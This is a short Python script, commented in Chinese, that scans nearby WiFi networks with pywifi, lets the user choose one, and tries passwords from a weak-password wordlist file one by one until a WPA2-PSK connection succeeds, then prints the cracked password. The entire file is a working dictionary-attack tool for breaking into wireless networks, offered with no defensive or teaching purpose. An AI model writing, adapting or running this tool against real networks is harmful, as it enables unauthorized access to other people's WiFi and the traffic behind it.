import pywifi,time,random,sys
from pywifi import const
from time import sleep

class ConnectWifi():
    
    def __init__(self,path):
        
        self.path = path
        self.wifiname = "xxx"
        self.password="123"
        self.wifiname="123"

    def wifisearch(self):
        
        List=[""]
        i=0
        try:
            wifi = pywifi.PyWiFi()
            ifaces = wifi.interfaces()[0]
            print(" 搜索到的wifi\n↓↓↓↓↓↓↓")
            for name in ifaces.scan_results():
                i=i+1
                if name.ssid in List :
                    None
                else:
                    List.append(name.ssid)
                    print(str(i)+"."+name.ssid)
            x = input("输入wifi序号:\n")
            self.wifiname=List[int(x)]
            print("开始破解："+self.wifiname+"\n")
        except Exception as e:
            print("没有找到wifi")
    def wifitest(self):
        
        wifi = pywifi.PyWiFi()                                  #获取网卡
        ifaces = wifi.interfaces()[0]                           #选择第一
        ifaces.disconnect()                 
        wifistatus = ifaces.status()        
        while wifistatus in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]:
            profile =pywifi.Profile()                           #创建连接文件
            profile.ssid = self.wifiname
            profile.key = self.password
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            ifaces.remove_all_network_profiles()                #删除wifi连接文件
            temp_profile = ifaces.add_network_profile(profile)  #导入新文件
            ifaces.connect(temp_profile)                        #连接wifi
            sleep(1)  #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<连接wifi等待时间，可以个根据实际情况调节
            if ifaces.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False

    def pwdget(self):

        file = open(self.path,"r",errors="ignore")
        while True:
            try:
                self.password = file.readline()
                if not self.password:                           #没有密码退出
                    file.close()
                    print("没有找到密码")
                    break
                elif m.wifitest():                              #连接成功退出
                    print("正确密码:%s"%(self.password))
                    file.close()
                    break
                else:
                    print("错误密码:%s"%(self.password))
            except Exception as e:
                print("破解失败:")
                
    def connect(self):

            m.wifisearch()
            m.wifitest()
            m.pwdget()

if __name__ == '__main__':
    m = ConnectWifi(
        path = r"D:\93543\文档\技术\wifi弱口令密码本 .txt"    #修改成密码文件路径
        )

    m.connect()


    
